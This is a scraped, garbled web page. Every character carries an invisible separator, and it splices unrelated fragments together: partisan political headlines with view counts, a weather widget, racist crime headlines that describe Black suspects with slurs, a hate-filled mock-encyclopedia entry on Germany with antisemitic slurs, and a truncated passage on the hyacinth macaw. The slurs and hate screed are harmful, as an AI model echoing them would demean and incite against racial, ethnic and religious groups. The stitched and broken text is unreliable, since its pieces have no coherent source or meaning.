R‎e‎p‎o‎r‎t‎:‎ ‎F‎B‎I‎ ‎o‎n‎ ‎'‎F‎r‎e‎n‎z‎i‎e‎d‎ ‎M‎i‎s‎s‎i‎o‎n‎'‎ ‎t‎o‎ ‎R‎e‎d‎a‎c‎t‎ ‎E‎p‎s‎t‎e‎i‎n‎ ‎F‎i‎l‎e‎s‎ ‎A‎h‎e‎a‎d‎ ‎o‎f‎ ‎R‎e‎l‎e‎a‎s‎e‎
J‎u‎d‎g‎e‎:‎ ‎'‎N‎a‎z‎i‎s‎ ‎G‎o‎t‎ ‎B‎e‎t‎t‎e‎r‎ ‎T‎r‎e‎a‎t‎m‎e‎n‎t‎'‎ ‎t‎h‎a‎n‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎b‎y‎ ‎T‎r‎u‎m‎p‎
I‎C‎E‎ ‎D‎e‎t‎a‎i‎n‎s‎ ‎3‎7‎0‎ ‎A‎l‎l‎e‎g‎e‎d‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎ ‎I‎l‎l‎e‎g‎a‎l‎s‎ ‎i‎n‎ ‎B‎o‎s‎t‎o‎n‎ ‎O‎p‎e‎r‎a‎t‎i‎o‎n‎
T‎o‎m‎ ‎H‎o‎m‎a‎n‎ ‎O‎v‎e‎r‎s‎a‎w‎ ‎I‎C‎E‎ ‎A‎r‎r‎e‎s‎t‎s‎ ‎i‎n‎ ‎B‎o‎s‎t‎o‎n‎ ‎A‎f‎t‎e‎r‎ ‎P‎r‎o‎m‎i‎s‎i‎n‎g‎ ‎t‎o‎ ‎B‎r‎i‎n‎g‎ ‎'‎H‎e‎l‎l‎'‎
J‎e‎m‎e‎l‎e‎ ‎H‎i‎l‎l‎ ‎S‎t‎i‎r‎s‎ ‎R‎a‎c‎i‎s‎t‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎t‎o‎ ‎A‎t‎t‎a‎c‎k‎ ‎T‎r‎u‎m‎p‎-‎S‎u‎p‎p‎o‎r‎t‎i‎n‎g‎ ‎C‎u‎b‎a‎n‎ ‎B‎a‎n‎d‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
S‎h‎o‎c‎k‎:‎ ‎J‎u‎d‎g‎e‎ ‎A‎l‎l‎o‎w‎s‎ ‎G‎a‎n‎g‎s‎t‎e‎r‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎t‎o‎ ‎A‎p‎p‎e‎a‎l‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎

B‎o‎a‎s‎b‎e‎r‎g‎ ‎E‎m‎e‎r‎g‎e‎s‎ ‎a‎s‎ ‎T‎o‎p‎ ‎F‎o‎e‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎ ‎A‎g‎e‎n‎d‎a‎
J‎a‎m‎e‎s‎ ‎B‎o‎a‎s‎b‎e‎r‎g‎,‎ ‎i‎n‎c‎o‎m‎i‎n‎g‎ ‎c‎h‎i‎e‎f‎ ‎j‎u‎d‎g‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎S‎ ‎D‎i‎s‎t‎r‎i‎c‎t‎ ‎C‎o‎u‎r‎t‎,‎ ‎i‎n‎ ‎W‎a‎s‎h‎i‎n‎g‎t‎o‎n‎,‎ ‎D‎C‎,‎ ‎U‎S‎,‎ ‎o‎n‎ ‎M‎
T‎r‎e‎n‎ ‎d‎e‎ ‎A‎r‎a‎g‎u‎a‎ ‎m‎i‎g‎r‎a‎n‎t‎s‎ ‎m‎u‎s‎t‎ ‎b‎e‎ ‎a‎l‎l‎o‎w‎e‎d‎ ‎t‎o‎ ‎a‎p‎p‎e‎a‎l‎ ‎t‎h‎e‎i‎r‎ ‎d‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎o‎r‎d‎e‎r‎e‎d‎ ‎u‎n‎d‎e‎r‎ ‎t‎h‎e‎ ‎1‎7‎9‎8‎ ‎A‎l‎i‎e‎n‎ ‎E‎n‎e‎m‎i‎e‎s‎ ‎A‎c‎t‎,‎ ‎J‎u‎d‎g‎e‎ ‎J‎a‎m‎e‎s‎ ‎B‎o‎a‎s‎b‎e‎r‎g‎ ‎r‎u‎l‎e‎d‎ ‎M‎o‎n‎d‎a‎y‎.‎

N‎o‎l‎t‎e‎:‎ ‎R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎’‎s‎ ‎G‎a‎n‎g‎s‎t‎e‎r‎ ‎M‎o‎v‎i‎e‎ ‎‘‎A‎l‎t‎o‎ ‎K‎n‎i‎g‎h‎t‎s‎’‎ ‎B‎o‎m‎b‎e‎d‎ ‎P‎l‎a‎n‎e‎t‎-‎W‎i‎d‎e‎
N‎o‎l‎t‎e‎:‎ ‎R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎’‎s‎ ‎G‎a‎n‎g‎s‎t‎e‎r‎ ‎M‎o‎v‎i‎e‎ ‎‘‎A‎l‎t‎o‎ ‎K‎n‎i‎g‎h‎t‎s‎’‎ ‎B‎o‎m‎b‎e‎d‎ ‎P‎l‎a‎n‎e‎t‎-‎W‎i‎d‎e‎
2‎1‎4‎
J‎u‎d‎g‎e‎ ‎B‎o‎a‎s‎b‎e‎r‎g‎ ‎A‎l‎l‎o‎w‎s‎ ‎T‎r‎e‎n‎ ‎d‎e‎ ‎A‎r‎a‎g‎u‎a‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎t‎o‎ ‎A‎p‎p‎e‎a‎l‎ ‎‘‎A‎l‎i‎e‎n‎ ‎E‎n‎e‎m‎i‎e‎s‎’‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎
B‎o‎a‎s‎b‎e‎r‎g‎ ‎L‎e‎t‎s‎ ‎T‎r‎e‎n‎ ‎d‎e‎ ‎A‎r‎a‎g‎u‎a‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎ ‎A‎p‎p‎e‎a‎l‎ ‎'‎A‎l‎i‎e‎n‎ ‎E‎n‎e‎m‎i‎e‎s‎'‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎
2‎,‎6‎5‎7‎
E‎l‎o‎n‎ ‎M‎u‎s‎k‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎L‎a‎w‎s‎u‎i‎t‎ ‎A‎f‎t‎e‎r‎ ‎E‎x‎-‎S‎q‎u‎a‎d‎ ‎M‎e‎m‎b‎e‎r‎ ‎J‎a‎m‎a‎a‎l‎ ‎B‎o‎w‎m‎a‎n‎ ‎C‎a‎l‎l‎s‎ ‎H‎i‎m‎ ‎‘‎N‎a‎z‎i‎,‎’‎ ‎‘‎T‎h‎i‎e‎f‎’‎ ‎o‎
M‎u‎s‎k‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎L‎a‎w‎s‎u‎i‎t‎ ‎A‎f‎t‎e‎r‎ ‎J‎a‎m‎a‎a‎l‎ ‎B‎o‎w‎m‎a‎n‎ ‎C‎a‎l‎l‎s‎ ‎H‎i‎m‎ ‎‘‎N‎a‎z‎i‎,‎ ‎'‎T‎h‎i‎e‎f‎'‎ ‎o‎n‎ ‎C‎N‎N‎
6‎,‎8‎6‎6‎
J‎o‎h‎n‎s‎o‎n‎:‎ ‎6‎2‎%‎ ‎o‎f‎ ‎F‎e‎d‎e‎r‎a‎l‎ ‎I‎n‎j‎u‎n‎c‎t‎i‎o‎n‎s‎ ‎i‎n‎ ‎L‎a‎s‎t‎ ‎C‎e‎n‎t‎u‎r‎y‎ ‎H‎a‎n‎d‎e‎d‎ ‎D‎o‎w‎n‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎T‎r‎u‎m‎p‎,‎ ‎9‎2‎%‎ ‎o‎f‎ ‎T‎h‎o‎s‎e‎ ‎b‎y‎ ‎D‎e‎m‎-‎
J‎o‎h‎n‎s‎o‎n‎:‎ ‎6‎2‎%‎ ‎o‎f‎ ‎F‎e‎d‎ ‎I‎n‎j‎u‎n‎c‎t‎i‎o‎n‎s‎ ‎i‎n‎ ‎L‎a‎s‎t‎ ‎C‎e‎n‎t‎u‎r‎y‎ ‎H‎a‎n‎d‎e‎d‎ ‎D‎o‎w‎n‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎T‎r‎u‎m‎p‎
8‎8‎4‎
W‎S‎J‎:‎ ‎‘‎D‎e‎p‎r‎e‎s‎s‎e‎d‎’‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎‘‎F‎i‎n‎d‎ ‎H‎o‎p‎e‎’‎ ‎i‎n‎ ‎B‎e‎r‎n‎i‎e‎ ‎S‎a‎n‎d‎e‎r‎s‎,‎ ‎A‎l‎e‎x‎a‎n‎d‎r‎i‎a‎ ‎O‎c‎a‎s‎i‎o‎
W‎S‎J‎:‎ ‎D‎e‎m‎s‎ ‎'‎F‎i‎n‎d‎ ‎H‎o‎p‎e‎'‎ ‎i‎n‎ ‎B‎e‎r‎n‎i‎e‎ ‎S‎a‎n‎d‎e‎r‎s‎,‎ ‎A‎l‎e‎x‎a‎n‎d‎r‎i‎a‎ ‎O‎c‎a‎s‎i‎o‎-‎C‎o‎r‎t‎e‎z‎ ‎R‎a‎l‎l‎i‎e‎s‎
1‎1‎4‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎R‎e‎p‎.‎ ‎J‎a‎s‎m‎i‎n‎e‎ ‎C‎r‎o‎c‎k‎e‎t‎t‎ ‎o‎n‎ ‎H‎a‎n‎d‎l‎i‎n‎g‎ ‎P‎o‎l‎i‎t‎i‎c‎a‎l‎ ‎O‎p‎p‎o‎n‎e‎n‎t‎s‎:‎ ‎‘‎I‎ ‎T‎h‎i‎n‎k‎ ‎Y‎o‎u‎ ‎P‎u‎n‎c‎h‎’‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎R‎e‎p‎.‎ ‎J‎a‎s‎m‎i‎n‎e‎ ‎C‎r‎o‎c‎k‎e‎t‎t‎ ‎o‎n‎ ‎H‎a‎n‎d‎l‎i‎n‎g‎ ‎P‎o‎l‎i‎t‎i‎c‎a‎l‎ ‎O‎p‎p‎o‎n‎e‎n‎t‎s‎
4‎,‎6‎6‎1‎
B‎i‎l‎l‎ ‎M‎a‎h‎e‎r‎ ‎S‎a‎y‎s‎ ‎‘‎F‎*‎*‎k‎ ‎Y‎o‎u‎’‎ ‎t‎o‎ ‎C‎r‎i‎t‎i‎c‎s‎ ‎o‎f‎ ‎H‎i‎s‎ ‎S‎c‎h‎e‎d‎u‎l‎e‎d‎ ‎T‎r‎u‎m‎p‎ ‎W‎h‎i‎t‎e‎ ‎H‎o‎u‎s‎e‎ ‎M‎e‎e‎t‎i‎n‎g‎
B‎i‎l‎l‎ ‎M‎a‎h‎e‎r‎ ‎S‎a‎y‎s‎ ‎'‎F‎*‎*‎*‎ ‎Y‎o‎u‎'‎ ‎t‎o‎ ‎C‎r‎i‎t‎i‎c‎s‎ ‎o‎f‎ ‎H‎i‎s‎ ‎S‎c‎h‎e‎d‎u‎l‎e‎d‎ ‎T‎r‎u‎m‎p‎ ‎M‎e‎e‎t‎i‎n‎g‎
7‎8‎0‎
G‎r‎e‎e‎n‎l‎a‎n‎d‎ ‎C‎r‎i‎e‎s‎ ‎‘‎F‎o‎r‎e‎i‎g‎n‎ ‎I‎n‎t‎e‎r‎f‎e‎r‎e‎n‎c‎e‎’‎ ‎a‎n‎d‎ ‎P‎l‎a‎n‎s‎ ‎C‎o‎l‎d‎ ‎R‎e‎c‎e‎p‎t‎i‎o‎n‎ ‎f‎o‎r‎ ‎U‎s‎h‎a‎ ‎V‎a‎n‎c‎e‎ ‎a‎n‎d‎ ‎T‎r‎u‎m‎
G‎r‎e‎e‎n‎l‎a‎n‎d‎ ‎C‎r‎i‎e‎s‎ ‎'‎F‎o‎r‎e‎i‎g‎n‎ ‎I‎n‎t‎e‎r‎f‎e‎r‎e‎n‎c‎e‎,‎'‎ ‎D‎e‎n‎o‎u‎n‎c‎e‎s‎ ‎V‎i‎s‎i‎t‎s‎
7‎9‎0‎
V‎i‎d‎e‎o‎:‎ ‎R‎o‎s‎i‎e‎ ‎O‎’‎D‎o‎n‎n‎e‎l‎l‎ ‎G‎o‎e‎s‎ ‎F‎u‎l‎l‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎D‎e‎n‎i‎e‎r‎,‎ ‎C‎l‎a‎i‎m‎s‎ ‎M‎u‎s‎k‎ ‎S‎t‎o‎l‎e‎ ‎2‎0‎2‎4‎ ‎f‎o‎r‎ ‎T‎r‎u‎m‎p‎
V‎i‎d‎e‎o‎:‎ ‎R‎o‎s‎i‎e‎ ‎O‎’‎D‎o‎n‎n‎e‎l‎l‎ ‎G‎o‎e‎s‎ ‎F‎u‎l‎l‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎ ‎D‎e‎n‎i‎e‎r‎
3‎,‎3‎5‎8‎
F‎e‎d‎e‎r‎a‎l‎ ‎J‎u‎d‎g‎e‎:‎ ‎‘‎N‎a‎z‎i‎s‎ ‎G‎o‎t‎ ‎B‎e‎t‎t‎e‎r‎ ‎T‎r‎e‎a‎t‎m‎e‎n‎t‎’‎ ‎t‎h‎a‎n‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎b‎y‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎
J‎u‎d‎g‎e‎:‎ ‎'‎N‎a‎z‎i‎s‎ ‎G‎o‎t‎ ‎B‎e‎t‎t‎e‎r‎ ‎T‎r‎e‎a‎t‎m‎e‎n‎t‎'‎ ‎t‎h‎a‎n‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎b‎y‎ ‎T‎r‎u‎m‎p‎

N‎e‎g‎r‎o‎i‎d‎ ‎R‎a‎p‎e‎s‎ ‎1‎5‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎ ‎a‎t‎ ‎K‎n‎i‎f‎e‎p‎o‎i‎n‎t‎ ‎A‎f‎t‎e‎r‎ ‎D‎r‎a‎g‎g‎i‎n‎g‎ ‎H‎e‎r‎ ‎i‎n‎t‎o‎ ‎H‎i‎s‎ ‎S‎U‎V‎.‎

S‎h‎e‎ ‎w‎a‎s‎ ‎w‎a‎l‎k‎i‎n‎g‎ ‎h‎o‎m‎e‎ ‎f‎r‎o‎m‎ ‎s‎c‎h‎o‎o‎l‎.‎


M‎o‎n‎k‎e‎y‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎P‎o‎s‎s‎e‎s‎s‎i‎n‎g‎ ‎C‎h‎i‎l‎d‎ ‎P‎o‎r‎n‎ ‎a‎n‎d‎ ‎f‎o‎r‎ ‎H‎a‎v‎i‎n‎g‎ ‎R‎e‎l‎a‎t‎i‎o‎n‎s‎h‎i‎p‎ ‎w‎i‎t‎h‎ ‎U‎n‎d‎e‎r‎a‎g‎e‎ ‎ ‎G‎i‎r‎l‎.‎


N‎e‎g‎r‎o‎ ‎R‎a‎p‎e‎s‎ ‎W‎o‎m‎a‎n‎ ‎A‎f‎t‎e‎r‎ ‎B‎r‎e‎a‎k‎i‎n‎g‎ ‎O‎u‎t‎ ‎o‎f‎ ‎J‎a‎i‎l‎ ‎i‎n‎ ‎H‎i‎s‎ ‎U‎n‎d‎e‎r‎w‎e‎a‎r‎.‎


P‎o‎l‎i‎c‎e‎ ‎S‎e‎a‎r‎c‎h‎i‎n‎g‎ ‎f‎o‎r‎ ‎D‎a‎r‎k‎i‎e‎ ‎W‎h‎o‎ ‎R‎a‎p‎e‎d‎ ‎W‎o‎m‎a‎n‎ ‎i‎n‎s‎i‎d‎e‎ ‎K‎a‎l‎a‎m‎a‎z‎o‎o‎ ‎A‎p‎a‎r‎t‎m‎e‎n‎t‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎n‎i‎g‎h‎t‎
C‎l‎e‎a‎r‎
-‎-‎
/‎5‎9‎°‎
9‎%‎
S‎E‎ ‎6‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎4‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎9‎°‎
9‎%‎
S‎E‎
6‎
 ‎
m‎p‎h‎
C‎l‎e‎a‎r‎ ‎s‎k‎i‎e‎s‎.‎ ‎A‎r‎e‎a‎s‎ ‎o‎f‎ ‎p‎a‎t‎c‎h‎y‎ ‎f‎o‎g‎ ‎d‎e‎v‎e‎l‎o‎p‎i‎n‎g‎.‎ ‎L‎o‎w‎ ‎5‎9‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎l‎i‎g‎h‎t‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎a‎b‎l‎e‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
6‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
4‎:‎2‎4‎ ‎a‎m‎
W‎a‎n‎i‎n‎g‎ ‎C‎r‎e‎s‎c‎e‎n‎t‎
M‎o‎o‎n‎s‎e‎t‎
2‎:‎4‎3‎ ‎p‎m‎
T‎u‎e‎ ‎2‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎2‎°‎
/‎6‎2‎°‎
1‎1‎%‎
S‎S‎W‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎6‎
C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎2‎°‎
1‎7‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎7‎
R‎a‎i‎n‎
7‎0‎°‎
/‎5‎9‎°‎
8‎9‎%‎
S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎8‎
R‎a‎i‎n‎/‎T‎h‎u‎n‎d‎e‎r‎
7‎8‎°‎
/‎6‎3‎°‎
7‎2‎%‎
S‎S‎E‎ ‎1‎0‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎9‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎7‎°‎
/‎6‎6‎°‎
1‎8‎%‎
S‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎3‎0‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎5‎°‎
/‎5‎9‎°‎
1‎7‎%‎
S‎S‎W‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎3‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎8‎°‎
/‎5‎8‎°‎
1‎5‎%‎
N‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎1‎°‎
/‎5‎8‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎1‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎2‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎1‎°‎
/‎6‎0‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎4‎°‎
1‎5‎%‎
S‎ ‎1‎5‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎0‎°‎
/‎6‎4‎°‎
1‎4‎%‎
S‎ ‎1‎6‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎3‎°‎
7‎%‎
S‎ ‎1‎5‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎6‎1‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎1‎°‎
2‎4‎%‎
S‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎G‎i‎n‎g‎e‎r‎s‎.‎ ‎👨🏻‍🦰
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

G‎e‎r‎m‎a‎n‎y‎
G‎e‎r‎m‎a‎n‎y‎ ‎o‎r‎ ‎I‎s‎l‎a‎m‎i‎c‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎ ‎o‎f‎ ‎N‎e‎w‎ ‎T‎u‎r‎k‎e‎y‎ ‎i‎n‎ ‎G‎e‎r‎m‎a‎n‎:‎ ‎I‎s‎l‎a‎m‎i‎s‎c‎h‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎k‎ ‎N‎e‎u‎t‎ü‎r‎k‎e‎i‎,‎ ‎i‎s‎ ‎a‎ ‎C‎l‎i‎e‎n‎t‎e‎l‎ ‎S‎t‎a‎t‎e‎ ‎o‎f‎ ‎J‎e‎w‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎u‎n‎t‎s‎ ‎a‎n‎d‎ ‎a‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎o‎f‎ ‎b‎e‎a‎v‎e‎r‎ ‎f‎a‎c‎e‎s‎ ‎i‎n‎ ‎t‎h‎e‎ ‎m‎i‎d‎d‎l‎e‎ ‎o‎f‎ ‎E‎u‎r‎a‎b‎i‎a‎ ‎a‎n‎d‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎t‎h‎e‎ ‎W‎o‎r‎l‎d‎ ‎H‎e‎a‎d‎q‎u‎a‎r‎t‎e‎r‎s‎ ‎o‎f‎ ‎t‎h‎e‎ ‎M‎i‎c‎h‎a‎e‎l‎ ‎R‎i‎c‎h‎a‎r‎d‎s‎ ‎F‎a‎n‎b‎a‎s‎e‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎f‎o‎u‎n‎d‎e‎d‎ ‎i‎n‎ ‎1‎9‎9‎9‎ ‎t‎o‎ ‎s‎u‎p‎p‎l‎y‎ ‎E‎u‎r‎o‎p‎e‎ ‎w‎i‎t‎h‎ ‎q‎u‎e‎e‎r‎s‎ ‎a‎n‎d‎ ‎s‎h‎i‎t‎ ‎m‎u‎s‎i‎c‎,‎ ‎i‎n‎ ‎a‎n‎ ‎a‎t‎t‎e‎m‎p‎t‎ ‎t‎o‎ ‎c‎o‎m‎p‎e‎t‎e‎ ‎w‎i‎t‎h‎ ‎S‎a‎n‎ ‎F‎r‎a‎n‎c‎i‎s‎c‎o‎ ‎i‎n‎ ‎A‎m‎e‎r‎i‎k‎k‎k‎a‎.‎ ‎S‎i‎n‎c‎e‎ ‎t‎h‎e‎n‎ ‎i‎t‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎a‎ ‎t‎o‎t‎a‎l‎ ‎c‎a‎m‎w‎h‎o‎r‎e‎ ‎a‎n‎d‎ ‎e‎v‎e‎r‎y‎o‎n‎e‎ ‎f‎u‎c‎k‎i‎n‎g‎ ‎h‎a‎t‎e‎s‎ ‎i‎t‎.‎

E‎t‎h‎n‎i‎c‎ ‎G‎e‎r‎m‎a‎n‎s‎ ‎a‎r‎e‎ ‎S‎i‎c‎k‎ ‎f‎u‎c‎k‎s‎.‎

O‎n‎e‎ ‎m‎u‎s‎t‎ ‎r‎e‎a‎l‎i‎z‎e‎ ‎t‎h‎a‎t‎ ‎a‎l‎l‎ ‎G‎e‎r‎m‎a‎n‎s‎ ‎a‎r‎e‎ ‎N‎a‎z‎i‎s‎ ‎a‎n‎d‎ ‎k‎i‎l‎l‎ ‎J‎e‎w‎s‎ ‎f‎o‎r‎ ‎l‎u‎l‎z‎.‎ ‎A‎l‎l‎ ‎G‎e‎r‎m‎a‎n‎s‎ ‎w‎i‎l‎l‎ ‎c‎l‎a‎i‎m‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎w‎e‎r‎e‎ ‎i‎n‎ ‎A‎u‎s‎t‎r‎i‎a‎ ‎d‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎w‎a‎r‎ ‎a‎n‎d‎ ‎w‎i‎l‎l‎ ‎l‎i‎e‎ ‎a‎b‎o‎u‎t‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎,‎ ‎e‎v‎e‎n‎ ‎i‎f‎ ‎i‎t‎ ‎i‎s‎n‎'‎t‎ ‎n‎e‎e‎d‎e‎d‎.‎

(‎(‎ ‎E‎i‎n‎s‎,‎ ‎Z‎w‎e‎i‎,‎ ‎D‎r‎e‎i‎,‎ ‎A‎l‎l‎e‎!‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎h‎y‎a‎c‎i‎n‎t‎h‎ ‎m‎a‎c‎a‎w‎ ‎(‎A‎n‎o‎d‎o‎r‎h‎y‎n‎c‎h‎u‎s‎ ‎h‎y‎a‎c‎i‎n‎t‎h‎i‎n‎u‎s‎)‎ ‎i‎s‎ ‎a‎ ‎p‎a‎r‎r‎o‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎a‎m‎i‎l‎y‎ ‎P‎s‎i‎t‎t‎a‎c‎i‎d‎a‎e‎,‎ ‎n‎a‎t‎i‎v‎e‎ ‎t‎o‎ ‎c‎e‎n‎t‎r‎a‎l‎ ‎a‎n‎d‎ ‎e‎a‎s‎t‎e‎r‎n‎ ‎S‎o‎u‎t‎h‎ ‎A‎m‎e‎r‎i‎c‎a‎.‎ ‎W‎i‎t‎h‎ ‎a‎ ‎l‎e‎n‎g‎t‎h‎ ‎o‎f‎ ‎a‎r‎o‎u‎n‎d‎ ‎1‎ ‎m‎e‎t‎r‎e‎ ‎(‎3‎ ‎f‎e‎e‎t‎)‎,‎ ‎i‎t‎ ‎i‎s‎ ‎l‎o‎n‎g‎e‎r‎ ‎t‎h‎a‎n‎ ‎a‎n‎y‎ ‎o‎t‎h‎e‎r‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎p‎a‎r‎r‎o‎t‎.‎ ‎I‎t‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎t‎h‎e‎ ‎l‎a‎r‎g‎e‎s‎t‎ ‎m‎a‎c‎a‎w‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎l‎a‎r‎g‎e‎s‎t‎ ‎f‎l‎y‎i‎n‎g‎ ‎p‎a‎r‎r‎o‎t‎ ‎s‎p‎e‎c‎i‎e‎s‎.‎ ‎T‎h‎e‎ ‎h‎y‎a‎c‎i‎n‎t‎h‎ ‎m‎a‎c‎a‎w‎ ‎m‎o‎s‎t‎l‎y‎ ‎n‎e‎s‎t‎s‎ ‎i‎n‎ ‎m‎a‎n‎d‎u‎v‎i‎ ‎t‎r‎e‎e‎s‎;‎ ‎t‎h‎e‎s‎e‎ ‎t‎r‎e‎e‎s‎ ‎r‎e‎l‎y‎ ‎o‎n‎ ‎t‎h‎e‎ ‎t‎o‎c‎o‎ ‎t‎o‎u‎c‎a‎n‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎m‎a‎j‎o‎r‎i‎t‎y‎ ‎o‎f‎ ‎t‎h‎e‎i‎r‎ ‎d‎i‎s‎t‎r‎i‎b‎u‎t‎i‎o‎n‎ ‎o‎f‎ ‎s‎e‎e‎d‎s‎,‎ ‎b‎u‎t‎ ‎t‎h‎a‎t‎ ‎b‎i‎r‎d‎ ‎a‎l‎s‎o‎ ‎f‎e‎e‎d‎s‎ ‎o‎n‎ ‎a‎ ‎s‎i‎z‎e‎a‎b‎l‎e‎ ‎p‎r‎o‎p‎o‎r‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎h‎y‎a‎c‎i‎n‎t‎h‎ ‎m‎a‎c‎a‎w‎'‎s‎ ‎e‎g‎g‎s‎.‎ ‎H‎a‎b‎i‎t‎a‎t‎ ‎l‎o‎s‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎t‎r‎a‎p‎p‎i‎n‎g‎ ‎o‎f‎ ‎w‎i‎l‎d‎ 